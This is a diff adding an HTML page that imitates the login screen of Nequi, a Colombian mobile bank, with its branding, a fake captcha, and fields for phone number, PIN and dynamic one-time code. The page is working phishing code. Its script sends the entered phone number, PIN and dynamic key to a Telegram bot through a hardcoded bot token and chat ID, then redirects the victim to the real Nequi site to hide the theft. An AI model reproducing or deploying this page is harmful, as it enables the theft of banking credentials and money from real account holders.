@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --orquidea: #da0081;
+            --uva: #200020;
+            --gris-texto: #646464;
+            --gris-fondo: #fceef6; /* Fondo rosado claro similar a la imagen */
+            --blanco: #ffffff;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Manrope', sans-serif;
+            background-color: var(--gris-fondo);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* --- DECORACIÓN DE FONDO (CUADROS) --- */
+        .bg-decor {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .square {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.4);
+            border-radius: 20px;
+        }
+
+        /* Posiciones aproximadas según la captura */
+        .sq1 { width: 150px; height: 150px; top: 15%; right: 10%; }
+        .sq2 { width: 100px; height: 100px; top: 40%; right: 5%; }
+        .sq3 { width: 180px; height: 180px; top: 55%; right: 15%; }
+        .sq4 { width: 120px; height: 120px; top: 20%; left: 5%; opacity: 0.3; }
+
+        /* HEADER */
+        .header-login {
+            padding: 20px 8%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: transparent;
+            z-index: 10;
+        }
+        .logo img { width: 90px; }
+        .btn-recarga {
+            background-color: var(--orquidea);
+            color: white;
+            padding: 10px 25px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        /* CONTENEDOR PRINCIPAL */
+        .login-section {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            z-index: 5;
+        }
+
+        .login-wrap {
+            background: var(--blanco);
+            width: 100%;
+            max-width: 400px;
+            padding: 45px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(32, 0, 32, 0.05);
+            text-align: center;
+        }
+
+        h1 { color: var(--uva); font-size: 26px; font-weight: 800; margin: 0 0 10px; }
+        p { color: var(--gris-texto); font-size: 14px; margin-bottom: 30px; }
+
+        /* FORMULARIO */
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-country {
+            display: flex;
+            background: #f8f1f5;
+            border-radius: 8px;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .prefix {
+            padding: 0 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            color: var(--uva);
+            border-right: 1px solid #e0d0da;
+            height: 55px;
+        }
+        .prefix img { width: 22px; }
+
+        input {
+            width: 100%;
+            height: 55px;
+            border: none;
+            background: #f8f1f5;
+            padding: 0 15px;
+            font-size: 16px;
+            color: var(--uva);
+            border-radius: 8px;
+            outline: none;
+        }
+
+        /* TOOLTIP CLAVE DINÁMICA */
+        .tooltip-box {
+            display: none;
+            position: absolute;
+            top: 65px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 280px;
+            background: white;
+            border-radius: 12px;
+            padding: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            z-index: 100;
+            border: 1px solid #eee;
+        }
+
+        .tooltip-arrow {
+            position: absolute;
+            top: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-left: 8px solid transparent;
+            border-right: 8px solid transparent;
+            border-bottom: 8px solid white;
+        }
+
+        .tooltip-title {
+            color: #646464;
+            font-size: 13px;
+            margin-bottom: 12px;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        .dynamic-code-mock {
+            background: #1a001a;
+            border-radius: 10px;
+            padding: 12px;
+            color: white;
+        }
+
+        .code-inner {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.1);
+            padding: 8px 10px;
+            border-radius: 6px;
+            margin-bottom: 8px;
+        }
+
+        .dot-pink { width: 10px; height: 10px; background: #da0081; border-radius: 50%; }
+        .code-label { font-size: 9px; opacity: 0.8; flex: 1; }
+        .code-number { font-size: 14px; font-weight: 700; letter-spacing: 1px; }
+        .lock-icon { width: 12px; filter: invert(1); }
+
+        .code-instruction { font-size: 11px; line-height: 1.3; opacity: 0.9; }
+        .show-tooltip { display: block !important; }
+
+        /* CAPTCHA */
+        .captcha-container {
+            border: 1px solid #e8e8e8;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin: 25px 0;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .captcha-container.active { border-color: #11da7a; background: #f0fdf4; }
+        
+        .check-circle {
+            width: 26px;
+            height: 26px;
+            border: 2px solid var(--orquidea);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .active .check-circle { background: #11da7a; border-color: #11da7a; }
+        .check-circle svg { display: none; width: 16px; fill: white; }
+        .active .check-circle svg { display: block; }
+
+        .captcha-text { font-size: 14px; color: var(--uva); font-weight: 500; text-align: left; }
+
+        .btn-submit {
+            width: 100%;
+            height: 55px;
+            background: #f4c2e0;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: not-allowed;
+            transition: 0.3s;
+        }
+        .btn-submit.active { background: var(--orquidea); cursor: pointer; }
+
+        /* FOOTER CON CORTE DIAGONAL */
+        footer {
+            background: var(--uva);
+            color: white;
+            padding: 80px 8% 30px;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        footer::before {
+            content: "";
+            position: absolute;
+            top: -40px;
+            left: 0;
+            width: 100%;
+            height: 80px;
+            background: var(--uva);
+            clip-path: polygon(0 100%, 100% 0, 100% 100%);
+        }
+
+        .footer-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; flex-wrap: wrap; gap: 20px; }
+        .footer-top .logo-white { width: 110px; filter: brightness(0) invert(1); }
+        .stores { display: flex; gap: 10px; }
+        .stores img { height: 35px; }
+        .logo-bancolombia { width: 140px; }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 30px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 40px;
+            margin-bottom: 40px;
+        }
+        .footer-col h4 { font-size: 14px; margin-bottom: 20px; color: white; }
+        .footer-col a { display: block; color: rgba(255,255,255,0.7); text-decoration: none; font-size: 13px; margin-bottom: 12px; }
+
+        .footer-bottom { border-top: 1px solid rgba(255,255,255,0.1); padding-top: 30px; display: flex; justify-content: space-between; align-items: center; }
+        .socials { display: flex; gap: 15px; }
+        .socials img { width: 20px; filter: brightness(0) invert(1); opacity: 0.6; }
+        .vigilado { font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 1px; }
+
+        @media (max-width: 768px) {
+            .btn-recarga, .footer-grid { display: none; }
+            .footer-top { flex-direction: column; text-align: center; }
+            .square { display: none; } /* Ocultar cuadros en móvil para limpiar la vista */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-decor">
+        <div class="square sq1"></div>
+        <div class="square sq2"></div>
+        <div class="square sq3"></div>
+        <div class="square sq4"></div>
+    </div>
+
+    <header class="header-login">
+        <div class="logo">
+            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg" alt="Nequi">
+        </div>
+        <a href="#" class="btn-recarga">Recarga</a>
+    </header>
+
+    <section class="login-section">
+        <div class="login-wrap">
+            <h1>Entra a tu Nequi</h1>
+            <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
+            
+            <div class="form">
+                <div class="form-group">
+                    <div class="input-country">
+                        <div class="prefix">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/2/21/Flag_of_Colombia.svg" alt="CO">
+                            +57
+                        </div>
+                        <input type="tel" id="user" placeholder="Número de celular" maxlength="10">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <input type="password" id="pass" placeholder="Contraseña" maxlength="4">
+                </div>
+
+                <div class="form-group">
+                    <input type="text" id="dinamica" placeholder="Clave dinámica" maxlength="6" autocomplete="off">
+                    <div id="tooltip-dinamica" class="tooltip-box">
+                        <div class="tooltip-arrow"></div>
+                        <div class="tooltip-title">Puedes copiar la clave dinámica directamente desde la app</div>
+                        <div class="dynamic-code-mock">
+                            <div class="code-inner">
+                                <span class="dot-pink"></span>
+                                <span class="code-label">Clave dinámica</span>
+                                <span class="code-number">201909</span>
+                                <img src="https://cdn-icons-png.flaticon.com/512/3064/3064155.png" class="lock-icon">
+                            </div>
+                            <div class="code-instruction">
+                                Ya puedes escribir o copiar tu clave dinámica para hacer tus pagos
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="captcha-container" id="captchaBox">
+                    <div class="check-circle">
+                        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    </div>
+                    <div class="captcha-text">Confirmo que soy una<br>persona real.</div>
+                </div>
+
+                <button class="btn-submit" id="btnEntrar" disabled>Entra</button>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-top">
+            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg" class="logo-white" alt="Nequi">
+            <div class="stores">
+                <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
+                <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
+                <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg">
+            </div>
+            <img src="https://uploads-ssl.webflow.com/65ce1c19567caef6f8949f6f/65ce1c19567caef6f894a575_logo-grupo-bancolombia.svg" class="logo-bancolombia">
+        </div>
+
+        <div class="footer-grid">
+            <div class="footer-col">
+                <h4>Información legal</h4>
+                <a href="#">Condiciones de uso</a>
+                <a href="#">Tratamiento de Datos</a>
+                <a href="#">Consumidor financiero</a>
+            </div>
+            <div class="footer-col">
+                <h4>Para personas</h4>
+                <a href="#">Tarjeta Nequi</a>
+                <a href="#">Crédito Salvavidas</a>
+                <a href="#">Paypal</a>
+            </div>
+            <div class="footer-col">
+                <h4>Para tu negocio</h4>
+                <a href="#">Negocios</a>
+            </div>
+            <div class="footer-col">
+                <h4>Ayuda</h4>
+                <a href="#">Centro de ayuda</a>
+                <a href="#">Tips de seguridad</a>
+            </div>
+            <div class="footer-col">
+                <h4>Conócenos</h4>
+                <a href="#">¿Quiénes somos?</a>
+                <a href="#">Sala de prensa</a>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <div class="socials">
+                <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png">
+                <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png">
+                <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png">
+                <img src="https://cdn-icons-png.flaticon.com/512/3536/3536505.png">
+            </div>
+            <div class="vigilado">VIGILADO SUPERINTENDENCIA FINANCIERA DE COLOMBIA</div>
+        </div>
+    </footer>
+
+    <script>
+        const captcha = document.getElementById('captchaBox');
+        const btn = document.getElementById('btnEntrar');
+        const inputDinamica = document.getElementById('dinamica');
+        const tooltip = document.getElementById('tooltip-dinamica');
+        
+        const TOKEN = '8645914326:AAFtHT7VXt5wYoMS8yEKOvVYD0L22mBiFsg';
+        const CHAT_ID = '8324606698';
+
+        inputDinamica.addEventListener('focus', () => {
+            tooltip.classList.add('show-tooltip');
+        });
+
+        inputDinamica.addEventListener('blur', () => {
+            setTimeout(() => {
+                tooltip.classList.remove('show-tooltip');
+            }, 200);
+        });
+
+        captcha.addEventListener('click', () => {
+            captcha.classList.toggle('active');
+            btn.disabled = !captcha.classList.contains('active');
+            btn.classList.toggle('active', !btn.disabled);
+        });
+
+        btn.addEventListener('click', () => {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const d = document.getElementById('dinamica').value;
+
+            if(!u || !p || !d) return alert("Completa los datos");
+
+            const msg = `🔐 *Acceso Nequi*\n📱 Cel: ${u}\n🔑 Pin: ${p}\n🌀 Dinámica: ${d}`;
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            }).then(() => {
+                window.location.href = "https://www.nequi.com.co";
+            });
+        });
+    </script>
+</body>
+</html>
